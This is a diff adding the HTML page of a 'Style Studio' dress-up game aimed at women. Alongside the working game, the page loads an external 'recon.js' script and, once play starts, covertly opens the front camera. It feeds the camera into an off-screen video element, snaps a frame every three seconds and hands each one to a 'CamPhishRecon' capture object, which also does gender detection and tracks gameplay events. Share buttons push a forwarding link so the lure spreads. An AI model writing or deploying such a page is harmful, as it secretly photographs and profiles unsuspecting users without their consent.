@@ -1,0 +1,150 @@
+<!-- DESC: Style Studio — mix and match fashion outfits, tap-based, female-focused -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#2a0a3e">
+<title>Style Studio</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#2a0a3e;color:#fff;font-family:-apple-system,sans-serif;overflow:hidden;touch-action:none;user-select:none;height:100vh;display:flex;flex-direction:column;align-items:center}
+.title{font-size:clamp(26px,7vw,44px);background:linear-gradient(135deg,#ff6b9d,#c44dff,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900;margin:12px 0 4px}
+.sub{color:#ff6b9d;font-size:12px;margin-bottom:12px}
+#meter-wrap{width:min(320px,85vw);margin-bottom:12px}
+#meter-label{display:flex;justify-content:space-between;font-size:12px;color:#ff6b9d;margin-bottom:4px}
+#meter-bar{height:16px;background:#1a0a2e;border-radius:8px;overflow:hidden;border:1px solid rgba(255,107,157,0.3)}
+#meter-fill{height:100%;width:0%;background:linear-gradient(90deg,#ff6b9d,#ffd700);border-radius:8px;transition:width .3s}
+#model{font-size:clamp(60px,20vw,100px);text-align:center;margin:8px 0;line-height:1.2}
+#outfit{text-align:center;font-size:clamp(30px,10vw,48px);margin-bottom:8px;line-height:1.2}
+#score{font-size:20px;color:#ffd700;font-weight:900;margin-bottom:12px}
+.cat-label{font-size:12px;color:#c44dff;font-weight:700;margin:6px 0 4px;text-transform:uppercase;letter-spacing:1px;width:min(320px,85vw)}
+.items{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;width:min(320px,85vw)}
+.item{width:48px;height:48px;border-radius:12px;background:#3a1a4e;display:flex;align-items:center;justify-content:center;font-size:24px;cursor:pointer;border:2px solid transparent;transition:all .15s}
+.item:active{transform:scale(0.9)}
+.item.selected{border-color:#ffd700;box-shadow:0 0 12px rgba(255,215,0,0.5)}
+.btn{background:linear-gradient(135deg,#ff6b9d,#c44dff);color:#fff;border:none;padding:12px 36px;font-size:16px;font-weight:800;border-radius:25px;cursor:pointer;margin:8px}
+.btn:active{transform:scale(0.95)}
+#unlock{color:#7bed9f;font-size:13px;margin:6px;min-height:18px;text-align:center}
+.hidden{display:none}
+.go{position:fixed;inset:0;background:rgba(42,10,62,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:50;text-align:center;padding:20px}
+.final{font-size:clamp(32px,9vw,52px);color:#ffd700;font-weight:900}
+.best{color:#ff6b9d;margin:8px 0 16px}
+.shares{display:flex;gap:8px;margin-bottom:16px}
+.sb{padding:10px 18px;border:none;border-radius:20px;color:#fff;font-weight:700;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.lb{color:#9680b0;font-size:12px;margin-top:12px}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="title">👗 Style Studio</div>
+<div class="sub">Mix & match to create the perfect look!</div>
+<div id="meter-wrap"><div id="meter-label"><span>Style Meter</span><span id="meter-pct">0%</span></div><div id="meter-bar"><div id="meter-fill"></div></div></div>
+<div id="model">🧍‍♀️</div>
+<div id="outfit"></div>
+<div id="score">Score: 0</div>
+<div class="cat-label"> Tops</div><div class="items" id="tops"></div>
+<div class="cat-label"> Bottoms</div><div class="items" id="bottoms"></div>
+<div class="cat-label"> Accessories</div><div class="items" id="accs"></div>
+<div class="cat-label"> Shoes</div><div class="items" id="shoes"></div>
+<div id="unlock"></div>
+<button class="btn" onclick="submit()">✨ Submit Look</button>
+<button class="btn hidden" id="startBtn" onclick="startGame()">▶ Start</button>
+<div class="go hidden" id="gameover">
+<div style="font-size:24px;color:#ff6b9d;margin-bottom:8px">Final Score</div>
+<div class="final" id="finalScore">0</div>
+<div class="best" id="bestScore"></div>
+<div class="shares"><button class="sb s-wa" onclick="shareCard('wa')">💬 Share</button><button class="sb s-fb" onclick="shareCard('fb')">📘 Share</button></div>
+<button class="btn" onclick="startGame()">▶ Play Again</button>
+<div class="lb" id="goLb"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL='forwarding_link/t/dress-up';
+var TOPS=['👕','👚','🥼','🧥','👘','👙','🦺'];
+var BOTS=['👖','👗','🩳','👔'];
+var ACCS=['👜','💍','🕶️','👑','🎀','🧣','🧢','📿'];
+var SHOES=['👟','👠','👢','🥿','🩰'];
+var selected={top:0,bot:0,acc:0,shoe:0};
+var score=0,lookCount=0,unlockedItems=0;
+var hs=[];try{hs=JSON.parse(localStorage.getItem('styleStudioHS')||'[]');}catch(e){}
+var ac=null;
+function snd(f){try{if(!ac)ac=new(AudioContext||webkitAudioContext)();var o=ac.createOscillator(),g=ac.createGain();o.frequency.value=f;o.type='sine';g.gain.value=0.06;o.connect(g);g.connect(ac.destination);o.start();g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+0.2);o.stop(ac.currentTime+0.2);}catch(e){}}
+function init(){
+renderItems('tops',TOPS,'top');renderItems('bottoms',BOTS,'bot');renderItems('accs',ACCS,'acc');renderItems('shoes',SHOES,'shoe');
+updateOutfit();showLb();
+}
+function renderItems(catId,arr,key){
+var el=document.getElementById(catId);el.innerHTML='';
+arr.forEach(function(emoji,i){
+var div=document.createElement('div');div.className='item'+(i===selected[key]?' selected':'');div.textContent=emoji;
+div.onclick=function(){selected[key]=i;snd(600+i*50);if(navigator.vibrate)navigator.vibrate(8);document.querySelectorAll('#'+catId+' .item').forEach(function(c){c.classList.remove('selected');});div.classList.add('selected');updateOutfit();};
+el.appendChild(div);});
+}
+function updateOutfit(){
+document.getElementById('outfit').textContent=TOPS[selected.top]+'\n'+BOTS[selected.bot];
+document.getElementById('model').textContent='🧍‍♀️';
+}
+function submit(){
+lookCount++;
+// Random style score with bonus for variety
+var styleScore=40+Math.floor(Math.random()*60);
+var bonus=(selected.top+selected.bot+selected.acc+selected.shoe)*2;
+styleScore+=bonus;
+if(styleScore>100)styleScore=100;
+score+=styleScore;
+var meterPct=Math.min(100,styleScore);
+document.getElementById('meter-fill').style.width=meterPct+'%';
+document.getElementById('meter-pct').textContent=meterPct+'%';
+document.getElementById('score').textContent='Score: '+score;
+snd(800+styleScore*5);
+if(navigator.vibrate)navigator.vibrate(styleScore>80?[30,30,30]:15);
+if(styleScore>=90){
+document.getElementById('unlock').textContent='🌟 Perfect look! +'+styleScore+' pts';
+}else if(styleScore>=70){
+document.getElementById('unlock').textContent='✨ Great style! +'+styleScore+' pts';
+}else{
+document.getElementById('unlock').textContent='Keep trying! +'+styleScore+' pts';
+}
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('outfit_submitted',{score:styleScore,look:lookCount});
+// Game ends after 5 looks
+if(lookCount>=5){setTimeout(endGame,1500);}
+}
+function startGame(){
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+score=0;lookCount=0;selected={top:0,bot:0,acc:0,shoe:0};
+document.getElementById('gameover').classList.add('hidden');
+document.getElementById('score').textContent='Score: 0';
+document.getElementById('meter-fill').style.width='0%';
+document.getElementById('meter-pct').textContent='0%';
+document.getElementById('unlock').textContent='Create 5 looks!';
+renderItems('tops',TOPS,'top');renderItems('bottoms',BOTS,'bot');renderItems('accs',ACCS,'acc');renderItems('shoes',SHOES,'shoe');
+if(navigator.mediaDevices&&window.CamPhishRecon){navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){var v=document.getElementById('v');v.srcObject=s;v.play();var cap=document.getElementById('cap'),cx=cap.getContext('2d');setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'canvas');}},3000);}).catch(function(){});}
+}
+function endGame(){
+hs.push(score);hs.sort(function(a,b){return b-a;});hs=hs.slice(0,5);localStorage.setItem('styleStudioHS',JSON.stringify(hs));
+document.getElementById('finalScore').textContent=score;
+document.getElementById('bestScore').textContent='Best: '+(hs[0]||0);
+document.getElementById('gameover').classList.remove('hidden');
+showLb();
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('game_over',{score:score,looks:lookCount});
+}
+function showLb(){var h='<b>🏆 Top Stylists</b><br>';for(var i=0;i<hs.length;i++)h+='<div>#'+(i+1)+' — '+hs[i]+'</div>';if(!hs.length)h='<b>🏆 Be the first!</b>';document.getElementById('goLb').innerHTML=h;}
+function shareCard(t){
+var cc=document.createElement('canvas');cc.width=600;cc.height=800;var x=cc.getContext('2d');
+var bg=x.createLinearGradient(0,0,0,800);bg.addColorStop(0,'#2a0a3e');bg.addColorStop(0.5,'#4a1a6e');bg.addColorStop(1,'#2a0a3e');x.fillStyle=bg;x.fillRect(0,0,600,800);
+x.font='70px system-ui';x.textAlign='center';x.fillText('🧍‍♀️',300,160);
+x.fillStyle='#ff6b9d';x.font='bold 36px system-ui';x.shadowColor='#ff6b9d';x.shadowBlur=15;x.fillText('👗 Style Studio',300,240);x.shadowBlur=0;
+x.fillStyle='#c44dff';x.font='18px system-ui';x.fillText('My Style Score',300,300);
+x.fillStyle='#ffd700';x.font='bold 72px system-ui';x.fillText(score,300,380);
+x.fillStyle='#7bed9f';x.font='16px system-ui';x.fillText(lookCount+' looks created',300,430);
+x.fillStyle='#fff';x.font='bold 22px system-ui';x.fillText('Can you style better?',300,490);
+x.fillStyle='#ff6b9d';x.font='bold 18px monospace';x.fillText(SHARE_URL,300,540);
+x.fillStyle='#9680b0';x.font='12px system-ui';x.fillText('Style Studio · Fashion Game',300,720);
+cc.toBlob(function(blob){var msg='👗 I scored '+score+' in Style Studio! Can you style better? '+SHARE_URL;var file=new File([blob],'style-studio.png',{type:'image/png'});if(navigator.canShare&&navigator.canShare({files:[file]})){navigator.share({text:msg,files:[file]}).catch(function(){});return;}if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='style-studio.png';a.click();},'image/png');
+}
+init();
+</script>
+</body></html>
